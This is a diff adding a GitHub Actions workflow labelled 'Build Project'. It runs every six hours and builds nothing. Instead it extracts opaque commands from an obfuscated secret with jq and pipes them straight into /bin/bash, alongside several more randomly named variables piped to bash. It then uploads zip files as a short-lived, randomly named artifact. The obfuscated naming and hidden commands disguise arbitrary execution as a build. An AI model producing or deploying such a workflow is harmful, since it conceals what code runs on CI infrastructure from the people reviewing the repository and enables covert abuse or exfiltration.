@@ -1,0 +1,31 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '43 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Process
+        env:
+          vsh8493: ${{ secrets.vsh8493 }}
+        run: |
+          printf '%s' "$vsh8493" | jq -r .yr05035 | /bin/bash
+          echo $ny466 | jq -r .ha1 | /bin/bash
+          echo $c39318 | jq -r .nwce14400 | /bin/bash
+          printf '%s' "$v435" | jq -r .xxos3 | /bin/bash
+          printf '%s' "$hyd86202" | jq -r .hpxt477 | /bin/bash
+
+      - name: Store results
+        uses: actions/upload-artifact@v4
+        with:
+          name: SWhlaRCc
+          path: "*.zip"
+          retention-days: 1
